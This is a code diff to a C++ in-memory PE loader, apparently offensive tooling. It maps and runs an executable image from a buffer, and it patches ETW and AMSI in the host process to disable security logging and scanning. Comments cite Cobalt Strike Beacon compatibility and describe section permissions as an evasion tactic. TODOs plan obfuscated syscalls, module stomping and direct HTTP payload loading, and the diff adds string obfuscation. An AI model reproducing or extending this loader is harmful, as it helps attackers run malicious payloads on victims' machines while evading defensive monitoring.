@@ -16,6 +16,7 @@
     	rename("ReportEvent", "InteropServices_ReportEvent")	\
 		rename("or", "InteropServices_or") // rename for c# symbols to not overwrite C++ functions/symbols
 
+// TODO: obfuscated syscalls for VirtualAlloc, CopyMemory, VirtualProtect, and VirtualFree ntdll functions
 // TODO: Module Stomping 
 // TODO: native ExitThread function exits out of current process, hook this and fix
 // TODO: parse headers and allocate straight from HTTP download 
@@ -185,19 +186,15 @@ DWORD rebaseImage(LPVOID peImageBase, IMAGE_NT_HEADERS* ntHeader) {
 			// add delta(between preferred base and current base)
 			addressToPatch += deltaImageBase;
 
-			// set to relocation table permission to allow patching
-			DWORD oldProtect, protectRes;
-			protectRes = VirtualProtect((PVOID)((DWORD_PTR)peImageBase+relocationRVA), sizeof(DWORD_PTR), PAGE_READWRITE, &oldProtect);
-			if (protectRes == 0) {
-				printf("[!] Error modifying memory page protection: %d\n",GetLastError());
-			}
+			//// set to relocation table permission to allow patching
+			//DWORD oldProtect, protectRes;
+			//VirtualProtect((PVOID)((DWORD_PTR)peImageBase+relocationRVA), sizeof(DWORD_PTR), PAGE_READWRITE, &oldProtect);
+
 			// write/patch new absolute address back into relocation entry
 			memcpy((PVOID)((DWORD_PTR)peImageBase+relocationRVA), &addressToPatch, sizeof(DWORD_PTR));
-			// restore to previous memory protection
-			protectRes = VirtualProtect((PVOID)((DWORD_PTR)peImageBase+relocationRVA), sizeof(DWORD_PTR), oldProtect, &oldProtect);
-			if (protectRes == 0) {
-				printf("[!] Error modifying memory page protection: %d\n",GetLastError());
-			}
+
+			//// restore to previous memory protection
+			//VirtualProtect((PVOID)((DWORD_PTR)peImageBase+relocationRVA), sizeof(DWORD_PTR), oldProtect, &oldProtect);
 
 			// debugging print
 			printf("Relocation Patching %x -> %x\n", addressToPatch - deltaImageBase, addressToPatch);
@@ -357,12 +354,12 @@ DWORD resolveImportAddressTable(LPVOID peImageBase, IMAGE_NT_HEADERS* ntHeader, 
 	PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;
 	importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)peImageBase);
 
-	// set to IAT table permission to allow patching
-	DWORD oldProtect, protectRes;
-	protectRes = VirtualProtect(importDescriptor, importsDirectory.Size, PAGE_READWRITE, &oldProtect);
-	if (protectRes == 0) {
-		printf("[!] Error modifying memory page protection: %d\n",GetLastError());
-	}
+	//// set to IAT table permission to allow patching
+	//DWORD oldProtect, protectRes;
+	//protectRes = VirtualProtect(importDescriptor, importsDirectory.Size, PAGE_READWRITE, &oldProtect);
+	//if (protectRes == 0) {
+	//	printf("[!] Error modifying memory page protection: %d\n",GetLastError());
+	//}
 
 	LPCSTR libraryName = "";
 	HMODULE library = NULL;
@@ -434,11 +431,11 @@ DWORD resolveImportAddressTable(LPVOID peImageBase, IMAGE_NT_HEADERS* ntHeader, 
 		importDescriptor++;
 	}
 
-	// restore previous IAT memory permissions
-	protectRes = VirtualProtect(importDescriptor, importsDirectory.Size, oldProtect, &oldProtect);
-	if (protectRes == 0) {
-		printf("[!] Error modifying memory page protection: %d\n",GetLastError());
-	}
+	//// restore previous IAT memory permissions
+	//protectRes = VirtualProtect(importDescriptor, importsDirectory.Size, oldProtect, &oldProtect);
+	//if (protectRes == 0) {
+	//	printf("[!] Error modifying memory page protection: %d\n",GetLastError());
+	//}
 
 	return 0;
 }
@@ -464,52 +461,12 @@ IMAGE_NT_HEADERS* getNT(char* peBuffer) {
 	return ntHeader;
 }
 
-// load native PE (will free peBuffer during loading)
-// reference: https://github.com/aaaddress1/RunPE-In-Memory Pe Loading
-// 1. copy header and image sections from PE into allocated memory
-// 2. if memory could not be allocated at preferred address, rebase all absolute address in relocation table (`.reloc`)
-// 3. load all libraries/dlls in import address table(IAT) into current process
-// 4. resolve all thunks(pointer to address of function) addresses/ordinals in imported libraries and write into IAT
-// 5. execute PE with entry function
-DWORD loadNative(char* peBuffer, int argc, char** argv) {
-	IMAGE_NT_HEADERS* ntHeader = getNT(peBuffer);
-	if (ntHeader == NULL) {
-		return 1;
-	}
-
-	// get image size
-	SIZE_T imageSize = ntHeader->OptionalHeader.SizeOfImage;
-	// get preferred base address, usually always 0x40000000 in .exe PE files
-	LPVOID preferredAddr = (LPVOID)ntHeader->OptionalHeader.ImageBase;
-
-	// unmap image base if it has been previously mapped
-	// only needed if ReflectiveLoader is loaded into a process twice?
-	// NtUnmapViewOfSection does not have a corresponding user-mode function
-	//((NTSTATUS(WINAPI*)(HANDLE, PVOID))GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection"))((HANDLE)-1, (LPVOID)ntHeader->OptionalHeader.ImageBase);
-
-	// try to alloc memory for image at preferred address 
-	// note: CobaltStrike Beacon will not work if it is not loaded at its preferred load address
-	LPVOID peImageBase = VirtualAlloc(preferredAddr, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-
-	// if allocation not possible at preferred address, allocate anywhere
-	if (!peImageBase) {
-		peImageBase = VirtualAlloc(NULL, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-	}
-	if (!peImageBase) {
-		printf("[!] cannot allocate image base, memory capacity reached?\n");
-		return 1;
-	}
-
-	// debug print
-	printf("copying PE section NT Header (%p) -> %p\n", peBuffer, peImageBase);
-	// copy image NT header to allocated memory
-	memcpy(peImageBase, peBuffer, ntHeader->OptionalHeader.SizeOfHeaders);
-
+DWORD setProtect(LPVOID peBuffer, IMAGE_NT_HEADERS* ntHeader){
 	// debug print
 	printf("setting permissions PAGE_READONLY on NT Header\n");
 	// NT headers are read only (IAT and relocation table permissions will have to be modified during patching)
 	DWORD oldProtect, protectRes;
-	protectRes = VirtualProtect(peImageBase, ntHeader->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &oldProtect);
+	protectRes = VirtualProtect(peBuffer, ntHeader->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &oldProtect);
 	if (protectRes == 0) {
 		printf("[!] Error modifying memory page protection: %d\n",GetLastError());
 	}
@@ -518,18 +475,8 @@ DWORD loadNative(char* peBuffer, int argc, char** argv) {
 	IMAGE_SECTION_HEADER* sectionHeader = (IMAGE_SECTION_HEADER*)(size_t(ntHeader) + sizeof(IMAGE_NT_HEADERS));
 	// copy image sections(.text, .data, .bss, ect) to allocated memory
 	for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
-		LPVOID sectionVA = LPVOID(size_t(peImageBase) + sectionHeader[i].VirtualAddress);
-		LPVOID sectionBuffer = LPVOID(size_t(peBuffer) + sectionHeader[i].PointerToRawData);
+		LPVOID sectionVA = LPVOID(size_t(peBuffer) + sectionHeader[i].VirtualAddress);
 		BYTE* sectionName = sectionHeader[i].Name;
-
-		// debugging print
-		printf("copying PE section %s (%p) -> %p\n", sectionName, sectionBuffer, sectionVA);
-		// copy PE section to virtual address
-		memcpy(
-			sectionVA, // destination: ImageBase + RVA = VA
-			sectionBuffer, // source: Buffer addr + raw data(file offset)
-			sectionHeader[i].SizeOfRawData
-		);
 
 		// change sections permissions(PAGE_EXECUTE_READWRITE) to specific permission (evasion tactic)
 		// Characteristics can be one or a combination of: IMAGE_SCN_MEM_EXECUTE, IMAGE_SCN_MEM_READ, IMAGE_SCN_MEM_WRITE
@@ -582,6 +529,68 @@ DWORD loadNative(char* peBuffer, int argc, char** argv) {
 		}
 	}
 
+	return 0;
+}
+
+// load native PE (will free peBuffer during loading)
+// reference: https://github.com/aaaddress1/RunPE-In-Memory Pe Loading
+// 1. copy header and image sections from PE into allocated memory
+// 2. if memory could not be allocated at preferred address, rebase all absolute address in relocation table (`.reloc`)
+// 3. load all libraries/dlls in import address table(IAT) into current process
+// 4. resolve all thunks(pointer to address of function) addresses/ordinals in imported libraries and write into IAT
+// 5. execute PE with entry function
+DWORD loadNative(char* peBuffer, int argc, char** argv) {
+	IMAGE_NT_HEADERS* ntHeader = getNT(peBuffer);
+	if (ntHeader == NULL) {
+		return 1;
+	}
+
+	// get image size
+	SIZE_T imageSize = ntHeader->OptionalHeader.SizeOfImage;
+	// get preferred base address, usually always 0x40000000 in .exe PE files
+	LPVOID preferredAddr = (LPVOID)ntHeader->OptionalHeader.ImageBase;
+
+	// unmap image base if it has been previously mapped
+	// only needed if ReflectiveLoader is loaded into a process twice?
+	// NtUnmapViewOfSection does not have a corresponding user-mode function
+	//((NTSTATUS(WINAPI*)(HANDLE, PVOID))GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection"))((HANDLE)-1, (LPVOID)ntHeader->OptionalHeader.ImageBase);
+
+	// try to alloc memory for image at preferred address 
+	// note: CobaltStrike Beacon will not work if it is not loaded at its preferred load address
+	LPVOID peImageBase = VirtualAlloc(preferredAddr, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+	// if allocation not possible at preferred address, allocate anywhere
+	if (!peImageBase) {
+		peImageBase = VirtualAlloc(NULL, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	}
+	if (!peImageBase) {
+		printf("[!] cannot allocate image base, memory capacity reached?\n");
+		return 1;
+	}
+
+	// debug print
+	printf("copying PE section NT Header (%p) -> %p\n", peBuffer, peImageBase);
+	// copy image NT header to allocated memory
+	memcpy(peImageBase, peBuffer, ntHeader->OptionalHeader.SizeOfHeaders);
+
+	// find section headers address (starts after NT headers)
+	IMAGE_SECTION_HEADER* sectionHeader = (IMAGE_SECTION_HEADER*)(size_t(ntHeader) + sizeof(IMAGE_NT_HEADERS));
+	// copy image sections(.text, .data, .bss, ect) to allocated memory
+	for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
+		LPVOID sectionVA = LPVOID(size_t(peImageBase) + sectionHeader[i].VirtualAddress);
+		LPVOID sectionBuffer = LPVOID(size_t(peBuffer) + sectionHeader[i].PointerToRawData);
+		BYTE* sectionName = sectionHeader[i].Name;
+
+		// debugging print
+		printf("copying PE section %s (%p) -> %p\n", sectionName, sectionBuffer, sectionVA);
+		// copy PE section to virtual address
+		memcpy(
+			sectionVA, // destination: ImageBase + RVA = VA
+			sectionBuffer, // source: Buffer addr + raw data(file offset)
+			sectionHeader[i].SizeOfRawData
+		);
+	}
+
 	// reference headers from allocated memory so buffer can be free'd
 	ntHeader = getNT((char *)peImageBase);
 	if (ntHeader == NULL) {
@@ -606,6 +615,9 @@ DWORD loadNative(char* peBuffer, int argc, char** argv) {
 		printf("[!] imports cannot be resolved\n");
 		return 1;
 	}
+
+	// set proper memory region protection
+	setProtect(peImageBase, ntHeader);
 
 	// get entry address
 	size_t entryAddr = (size_t)(peImageBase)+ntHeader->OptionalHeader.AddressOfEntryPoint;
@@ -852,12 +864,17 @@ DWORD patchETW(bool is32Bit = true) {
 		patchSize = 1;
 	}
 
+	// hold string on .text segment (simply obfuscation)
+	//char modName[] = { 'n','t','e','l','l','\0' };
+	//modName[2] = 'd';
+	char* modName = (char *)"ntdll";
+
 	// !this check is pointless since ntdll is loaded in ever process!
 	// LoadLibraryA if it hasn't already been loaded
     // running LoadLibraryA multiple times will not load the module repeatedly but will increase its reference count
-    HMODULE ntdll = GetModuleHandleA("ntdll");
+    HMODULE ntdll = GetModuleHandleA(modName);
     if(ntdll == nullptr){
-        ntdll = LoadLibraryA("ntdll");
+        ntdll = LoadLibraryA(modName);
     }
 
 	// Get the EventWrite function
@@ -870,7 +887,7 @@ DWORD patchETW(bool is32Bit = true) {
 	VirtualProtect(eventWrite, patchSize, oldProt, &oldProt);
 
 	// debugging print
-	printf("Patched EWT in host at %08x\n", eventWrite);
+	printf("Patched EWT in host at %08x\n", (unsigned int)eventWrite);
 
 	return 0;
 }
@@ -907,7 +924,7 @@ DWORD patchAMSI(bool is32Bit = true) {
 	VirtualProtect(sBuffAddr, patchSize, oldProt, &oldProt);
 
 	// debugging print
-	printf("Patched AMSI in host at %08x\n", sBuffAddr);
+	printf("Patched AMSI in host at %08x\n", (unsigned int)sBuffAddr);
 
 	return 0;
 }
